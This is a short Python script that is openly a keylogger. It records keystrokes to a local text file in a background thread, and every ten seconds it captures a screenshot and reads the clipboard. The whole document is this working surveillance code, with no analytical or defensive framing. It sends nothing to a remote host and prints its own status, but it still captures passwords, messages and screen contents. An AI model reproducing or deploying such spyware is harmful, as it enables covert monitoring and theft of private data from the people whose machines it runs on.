import pynput.keyboard
from pynput.keyboard import Listener
import pyperclip
import pyautogui
import time
import threading
import sys


log_file = "keys_logged.txt"    

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            if key == pynput.keyboard.Key.enter:    
                file.write("\n")                  
            elif key == pynput.keyboard.Key.backspace:
                file.write("[BACKSPACE]")        
            elif key == pynput.keyboard.Key.space:  
                file.write(" ")
            elif hasattr(key, 'char') and key.char is not None:
                file.write(str(key.char))
                
        # Check for escape key to exit
        if key == pynput.keyboard.Key.esc:
            return False  # Stop listener
    except Exception as e:  
        print(f"Error: {e}")
    

def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()


def capture_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    print("Screenshot saved.")


def capture_clipboard():
    clipboard_content = pyperclip.paste()
    print(f"Clipboard content: {clipboard_content}")


def keylogger_with_additional_features():
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()


keylogger_with_additional_features()

print("Key logging started...")

try:
    while True:
        time.sleep(10)
        capture_clipboard()
        capture_screenshot()
except KeyboardInterrupt:
    print("Program terminated by user")
    sys.exit()